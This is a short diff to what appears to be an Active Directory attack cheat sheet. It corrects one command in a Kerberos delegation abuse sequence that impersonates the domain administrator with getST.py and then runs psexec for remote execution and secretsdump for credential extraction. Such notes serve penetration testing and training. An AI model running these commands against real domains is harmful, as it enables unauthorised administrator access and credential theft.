@@ -761,7 +761,7 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
 getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
-Export KRB5CCNAME=administrator.ccache
+export KRB5CCNAME=administrator.ccache
 python3 Psexec.py -k -no-pass <TARGET FQDN>
 python3 Secretsdump.py -k <TARGET FQDN>
 ```
